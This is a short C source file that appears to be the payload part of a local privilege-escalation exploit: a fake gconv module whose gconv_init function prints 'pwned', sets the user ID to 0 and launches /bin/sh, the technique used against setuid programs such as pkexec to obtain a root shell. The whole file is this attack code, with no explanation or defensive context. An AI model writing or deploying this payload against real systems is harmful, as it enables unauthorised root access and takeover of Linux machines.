#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>

void gconv() {}

void gconv_init() {
	printf("pwned. uid=%d  euid=%d\n", (int)getuid(), (int)geteuid());
	setuid(0);
	printf("uid set to 0\n");
	char* argv[] = { "/bin/sh", NULL };
	char* envp[] = { NULL };
	execve("/bin/sh", argv, envp);
}
